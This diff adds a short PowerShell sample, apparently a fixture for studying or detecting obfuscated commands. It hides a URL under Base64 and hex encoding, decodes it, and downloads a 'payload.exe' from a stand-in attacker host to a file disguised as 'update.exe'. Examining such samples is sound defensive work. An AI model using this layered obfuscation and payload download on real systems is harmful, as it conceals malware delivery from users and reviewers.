@@ -1,0 +1,11 @@
+# Nested encoding: Base64 -> Hex -> URL
+# The attacker hid a malicious URL inside hex, then base64-encoded the hex.
+
+$encoded = "Njg3NDc0NzAzYTJmMmY2NTc2Njk2YzJlNjU3ODYxNmQ3MDZjNjUyZTYzNmY2ZDJmNzA2MTc5NmM2ZjYxNjQyZTY1Nzg2NTNmNzQ2ZjZiNjU2ZTNkNjE2MjYzMzEzMjMz"
+$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))
+$bytes = [byte[]]::new($decoded.Length / 2)
+for ($i = 0; $i -lt $bytes.Length; $i++) {
+    $bytes[$i] = [Convert]::ToByte($decoded.Substring($i * 2, 2), 16)
+}
+$finalUrl = [System.Text.Encoding]::UTF8.GetString($bytes)
+Invoke-WebRequest -Uri $finalUrl -OutFile C:\temp\update.exe
